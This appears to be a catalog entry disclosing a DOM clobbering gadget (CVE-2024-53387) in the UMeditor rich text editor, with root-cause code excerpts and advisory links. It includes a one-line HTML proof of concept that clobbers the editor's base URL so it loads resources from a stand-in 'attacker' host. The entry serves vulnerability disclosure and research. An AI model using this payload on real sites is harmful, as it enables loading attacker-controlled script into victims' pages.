---
description: UMeditor, referred to as UM, is a simplified version of [ueditor](https://github.com/fex-team/ueditor). It is an online rich text editor specially customized to meet the needs of portal websites for simple post boxes and reply boxes.
github: fex-team/umeditor
gadgets:
  ≤1.2.2:
    cve: CVE-2024-53387
    authors:
      - github:jackfromeast
      - github:ishmeals
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - a-tag
      - id-attr
      - strict-dynamic-csp
      - before-lib-load
    pocs:
      - description: The UMeditor library was relying on the `#UMEDITOR_HOME_URL` anchor to configure its base URL for loading resources. By clobbering it, it was possible to load arbitrary ressources.
        code: |
          <a id="UMEDITOR_HOME_URL" href="http://attacker/"></a>
        preview: false
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://github.com/fex-team/umeditor/blob/cc30bd9f2207340e94d51d09b57185e2f5099f46/umeditor.config.js#L22">https://github.com/fex-team/umeditor/blob/cc30bd9f2207340e94d51d09b57185e2f5099f46/umeditor.config.js#L22</a>

      ```javascript
      var URL = window.UMEDITOR_HOME_URL ||
      ```

      Source: <a target="_blank" href="https://github.com/fex-team/umeditor/blob/cc30bd9f2207340e94d51d09b57185e2f5099f46/umeditor.config.js#L133">https://github.com/fex-team/umeditor/blob/cc30bd9f2207340e94d51d09b57185e2f5099f46/umeditor.config.js#L133</a>

      ```javascript
      window.UMEDITOR_CONFIG = {

          //为编辑器实例添加一个路径，这个不能被注释
          UMEDITOR_HOME_URL : URL
      ```
    links:
      - https://github.com/advisories/GHSA-35g5-m5m3-r8mx
      - https://gist.github.com/jackfromeast/d52c506113f33b8871d0e647411df894
      - https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/umeditor.md
      - https://github.com/fex-team/umeditor/blob/30b87925e7c725ec1ec6c487d4d80967cbcb58e3/umeditor.config.js#L26-L42
      - https://jackfromeast.github.io/assets/DOMinoEffect.pdf
---
